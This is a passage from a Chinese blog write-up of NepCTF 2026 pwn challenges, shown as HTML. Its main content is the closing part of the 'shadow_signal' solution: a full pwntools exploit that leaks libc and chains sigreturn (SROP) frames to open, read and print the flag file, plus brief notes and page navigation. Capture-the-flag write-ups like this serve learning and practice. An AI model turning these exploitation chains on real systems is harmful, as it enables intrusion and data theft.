+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">path = stage + <span class="number">0x480</span>   <span class="comment"># 0x480: FLAG + b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x000</span>: flat(</span><br><span class="line">    pop_rax,</span><br><span class="line">    constants.SYS_rt_sigreturn,</span><br><span class="line">    syscall,</span><br><span class="line">    make_frame(constants.SYS_open, path, <span class="number">0</span>, <span class="number">0</span>, read_chain, syscall),</span><br><span class="line">),</span><br></pre></td></tr></table></figure>
+
+<p>先利用 syscall 调用<code>constants.SYS_rt_sigreturn</code>触发中断，之后利用 SROP 执行<code>open(&quot;flag&quot;, 0);</code></p>
+<p>设置 rsp &#x3D; read_chain &#x3D; bss + 0x180，然后执行 read-srop</p>
+<p>同理去布置 read 和 write 的 SROP-ORW 链即可，最后发送 payload 去接收即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;signal\n&quot;</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.send(payload3)</span><br></pre></td></tr></table></figure>
+
+<h3 id="总-EXP：-2"><a href="#总-EXP：-2" class="headerlink" title="总 EXP："></a>总 EXP：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">BIN = args.BIN <span class="keyword">or</span> <span class="string">&quot;./shadow_signal_patched&quot;</span></span><br><span class="line">FLAG = args.FLAG.encode() <span class="keyword">if</span> args.FLAG <span class="keyword">else</span> <span class="string">b&quot;flag&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(BIN, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> process([elf.path])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_frame</span>(<span class="params">rax, rdi, rsi, rdx, rsp, rip</span>):</span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = rax</span><br><span class="line">    frame.rdi = rdi</span><br><span class="line">    frame.rsi = rsi</span><br><span class="line">    frame.rdx = rdx</span><br><span class="line">    frame.rsp = rsp</span><br><span class="line">    frame.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">gift = <span class="built_in">int</span>(io.recvline_contains(<span class="string">b&quot;gift&quot;</span>).split()[-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">libc.address = gift - libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc base = %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">pop_rax = libc.address + <span class="number">0x45EB0</span></span><br><span class="line">syscall = libc.address + <span class="number">0x91316</span></span><br><span class="line">restore_rt = libc.address + <span class="number">0x42520</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">stage = bss + <span class="number">0x800</span></span><br><span class="line">buf = bss + <span class="number">0x1800</span></span><br><span class="line">path = stage + <span class="number">0x480</span></span><br><span class="line"></span><br><span class="line">read_chain = stage + <span class="number">0x180</span></span><br><span class="line">write_chain = stage + <span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat(</span><br><span class="line">    <span class="string">b&quot;a&quot;</span> * <span class="number">0x110</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    restore_rt,</span><br><span class="line">    make_frame(constants.SYS_read, <span class="number">0</span>, stage, <span class="number">0x600</span>, stage, syscall),</span><br><span class="line">).ljust(<span class="number">0x500</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x000</span>: flat(</span><br><span class="line">            pop_rax,</span><br><span class="line">            constants.SYS_rt_sigreturn,</span><br><span class="line">            syscall,</span><br><span class="line">            make_frame(constants.SYS_open, path, <span class="number">0</span>, <span class="number">0</span>, read_chain, syscall),</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x180</span>: flat(</span><br><span class="line">            pop_rax,</span><br><span class="line">            constants.SYS_rt_sigreturn,</span><br><span class="line">            syscall,</span><br><span class="line">            make_frame(constants.SYS_read, <span class="number">3</span>, buf, <span class="number">0x200</span>, write_chain, syscall),</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x300</span>: flat(</span><br><span class="line">            pop_rax,</span><br><span class="line">            constants.SYS_rt_sigreturn,</span><br><span class="line">            syscall,</span><br><span class="line">            make_frame(constants.SYS_write, <span class="number">1</span>, buf, <span class="number">0x200</span>, stage + <span class="number">0x580</span>, syscall),</span><br><span class="line">        ),</span><br><span class="line">        <span class="number">0x480</span>: FLAG + <span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    length=<span class="number">0x600</span>,</span><br><span class="line">    filler=<span class="string">b&quot;a&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;signal\n&quot;</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvall(timeout=<span class="number">3</span>).rstrip(<span class="string">b&quot;\x00&quot;</span>).decode(errors=<span class="string">&quot;replace&quot;</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>emmm 这道题目有之前写过的类似题目打基础，因此感觉算是几个 pwn 当中最简单的一个了。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784542035330-bab7aa77-f0c2-4d42-bb07-34b4d9d0ae74.png"></p>
+<h2 id="杂记："><a href="#杂记：" class="headerlink" title="杂记："></a>杂记：</h2><p>做题当作遗留的一些小问题，之后再慢慢解决，先记录在这里</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784347174064-31e07aa5-24ea-4b31-b75e-d3cd38d0708f.png"></p>
+<p>BizHawk 模拟器逃逸</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784349460116-0879319a-4c9b-4915-821c-70d2ad24eb59.png"></p>
+<p>准备开始写 EXP，看看动态调试：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784304089814-e470d5e0-43cd-441b-9654-79b9888bec56.png"></p>
+<p>额，似乎 pwndbg 和 gef 都不能进行动调</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784451404348-3db3c46b-d117-4b52-b654-2adb9b776ff4.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784451438066-19b6b52e-4999-4e41-8f0c-aa9f255d2529.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784456574369-92942aa5-e965-4d11-aac6-d55115df8c24.png"></p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+          <img data-src="/HFTTC.github.io/images/pwn/covers/l3akctf2026.jpg" data-sizes="auto" alt="L3akCTF 2026" class="lazyload">
+        <a href="/HFTTC.github.io/2026/08/05/l3akctf2026/" aria-label="前一篇: L3akCTF 2026" title="前一篇: L3akCTF 2026"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            L3akCTF 2026
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+        <img data-src="/HFTTC.github.io/images/pwn/covers/pwn-newbie-basics-1.jpg?v=202607261709" data-sizes="auto" alt="PWN 新生基础知识 1" class="lazyload">
+      <a href="/HFTTC.github.io/2026/07/26/PWN-%E6%96%B0%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-1/" aria-label="后一篇: PWN 新生基础知识 1"  title="后一篇: PWN 新生基础知识 1"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          PWN 新生基础知识 1
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        268.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        22:06
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#different-ROP"><span class="toc-number">1.</span> <span class="toc-text">different_ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">解题记录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">解题思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0-hexagon%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">学习 hexagon：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">IDA 静态分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-pwn-%E6%96%87%E4%BB%B6%E7%BB%93%E5%90%88%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">运行 pwn 文件结合分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87-K-%E9%A2%98"><span class="toc-number">1.2.4.</span> <span class="toc-text">准备 K 题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E5%81%9A%E4%B8%80%E4%BA%9B%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.3.1.</span> <span class="toc-text">先做一些准备工作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.3.2.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#syscall-%E8%B0%83%E7%94%A8-read"><span class="toc-number">1.3.3.</span> <span class="toc-text">syscall 调用 read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ORW"><span class="toc-number">1.3.4.</span> <span class="toc-text">ORW</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#onlyone"><span class="toc-number">2.</span> <span class="toc-text">onlyone</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">解题记录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">IDA 静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%BE%E5%88%B0-main-%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">直接找到 main 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B2%A1%E4%BB%80%E4%B9%88%E5%8F%91%E7%8E%B0%EF%BC%8C%E5%86%8D%E5%9B%9E%E5%8E%BB%E7%9C%8B%E4%B8%80%E7%9C%8B-if%EF%BC%9A"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">没什么发现，再回去看一看 if：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%88%86%E6%9E%90-sub-14D2"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">直接分析 sub_14D2</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#add%EF%BC%9A"><span class="toc-number">2.2.1.3.1.</span> <span class="toc-text">add：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#write%EF%BC%9A"><span class="toc-number">2.2.1.3.2.</span> <span class="toc-text">write：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#free%EF%BC%9A"><span class="toc-number">2.2.1.3.3.</span> <span class="toc-text">free：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#show%EF%BC%9A"><span class="toc-number">2.2.1.3.4.</span> <span class="toc-text">show：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#poke%EF%BC%9A"><span class="toc-number">2.2.1.3.5.</span> <span class="toc-text">poke：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#trigger%EF%BC%9A"><span class="toc-number">2.2.1.3.6.</span> <span class="toc-text">trigger：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">总结一下思路：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text">EXP 思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">2.3.1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%89%93%E4%B8%80%E4%B8%AA-poisoning"><span class="toc-number">2.3.2.</span> <span class="toc-text">先打一个 poisoning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1-freelist-posioning"><span class="toc-number">2.3.3.</span> <span class="toc-text">第二次 freelist posioning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%9A"><span class="toc-number">2.3.4.</span> <span class="toc-text">栈迁移：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SROP%EF%BC%9A"><span class="toc-number">2.3.5.</span> <span class="toc-text">SROP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A-1"><span class="toc-number">2.4.</span> <span class="toc-text">总 EXP：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="toc-number">2.4.1.</span> <span class="toc-text">另一种解法：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shadow-signal"><span class="toc-number">3.</span> <span class="toc-text">shadow_signal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-2"><span class="toc-number">3.1.</span> <span class="toc-text">解题记录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="toc-number">3.2.</span> <span class="toc-text">解题思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A-2"><span class="toc-number">3.2.1.</span> <span class="toc-text">IDA 静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main%EF%BC%9A"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">main：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#init%EF%BC%9A"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">init：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#handler%EF%BC%9A"><span class="toc-number">3.2.1.3.</span> <span class="toc-text">handler：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="toc-number">3.3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc"><span class="toc-number">3.3.1.</span> <span class="toc-text">泄露 libc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1-SROP"><span class="toc-number">3.3.2.</span> <span class="toc-text">第一次 SROP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ORWSROP%EF%BC%9A"><span class="toc-number">3.3.3.</span> <span class="toc-text">ORWSROP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A-2"><span class="toc-number">3.4.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E8%AE%B0%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">杂记：</span></a></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">142</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/notice" aria-label="公告"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">公告</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="/HFTTC.github.io/js/lazyload-local.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "NepCTF 2026 PWN",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/08/05/nepctf-2026-pwn/",
+          excerpt: "",
+          description: "",
+          stripContent: "前言：最近在同学家玩，忙里偷闲打一打 nepctf，纯手搓的 wp，能不能给我个惊喜嘿嘿 ^_^ 其实打这场比赛主要是为了学一点新知识，大一结束了，转头发现其实大一也没打过什么有意思的比赛，nep 的口碑一直挺不错的，想着学习学习。开了四个 pwn 两个 re 和一个 web 还有一个 realworld，其中 realworld 和一个 re 是直接让 ai 打得，不得不感叹 ai 确实是比人强得多，感觉除了强之外还有快，让所有 ctfer 在比赛当中为了拿血或高分不得不使用 ai 自动化开题",
+          date: "Wed Aug 05 2026 21:30:00 GMT+0800",
+          updated: "Wed Aug 05 2026 21:33:15 GMT+0800",
+          cover: "/HFTTC.github.io/images/pwn/covers/nepctf-2026-pwn.jpg",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
